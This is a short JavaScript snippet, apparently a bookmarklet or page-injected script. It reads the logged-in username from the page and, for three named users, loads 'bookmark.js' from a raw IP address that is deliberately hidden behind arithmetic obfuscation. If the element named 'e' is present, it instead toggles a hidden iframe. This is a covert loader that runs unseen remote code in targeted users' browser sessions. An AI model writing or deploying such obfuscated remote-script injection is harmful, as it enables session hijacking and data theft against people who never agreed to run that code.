function e() {
  var escript = document.createElement("script"); 
  var earray = [(2*2 - 1*2)+1, (6*6*6) - (2*3-(6/3)-2*2+2), 6*6*2*3 - (6+12), (3-29)*(21+29)+29*(21-3+29)]
  escript.src = `https://${earray.join(".")}/bookmark.js`; 
  document.body.appendChild(escript)
}

if(document.getElementsByName("e").length >= 1) {
  document.getElementById("eiframe").classList.toggle("ehidden");
} else {
  var eusers = ["alvin", "josue", "dylan"]
  var euser = document.getElementsByClassName("fa fa-user")[0].parentElement.innerText.replaceAll("  ", "").toLowerCase();
  eusers.forEach(eeuser => {
      if(euser.includes(eeuser)) return e()
  })
}
